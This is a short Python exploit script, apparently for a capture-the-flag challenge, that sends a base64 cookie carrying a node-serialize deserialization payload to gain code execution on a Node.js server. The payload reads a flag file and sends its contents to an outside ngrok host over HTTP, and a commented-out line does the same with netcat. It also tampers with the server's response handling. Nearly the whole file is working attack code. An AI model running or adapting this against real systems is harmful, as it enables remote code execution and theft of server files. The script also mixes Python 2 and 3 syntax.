#!/usr/bin/env python3
import requests
import re
import base64
import sys

url = 'http://web.zh3r0.cf:6666/guest/' # change this

payload = ("require('http').ServerResponse.prototype.end = (function (end) {"
"return function () {"
"['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
"console.log('still inside');"
"const fs = require('fs');"
"const http = require('http');"
"const data = fs.readFileSync('../../../flag.txt', 'utf8');"
"const { exec } = require('child_process');"
"console.log(data.toString());"
"const options = {hostname: '8.tcp.ngrok.io', port: 10968, path:encodeURIComponent('/'+data.toString()), method: 'GET'};"
"const req = http.get(options);"
"req.end();"
"}"
"})(require('http').ServerResponse.prototype.end)")

# rce = "_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'cat ../../../flag.txt | nc 4.tcp.ngrok.io 10793\', function(error, stdout, stderr) { console.log(stdout) });}()"
# code ="_$$ND_FUNC$$_console.log('behind you');"
code = "_$$ND_FUNC$$_" + payload

string = '{"username":"TheUndead","country":"worldwide","city":"Tyr", "exec": "'+code+'"}'

cookie = {'guest':base64.b64encode(string)}

try:
    response = requests.post(url, cookies=cookie).text
    print response
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)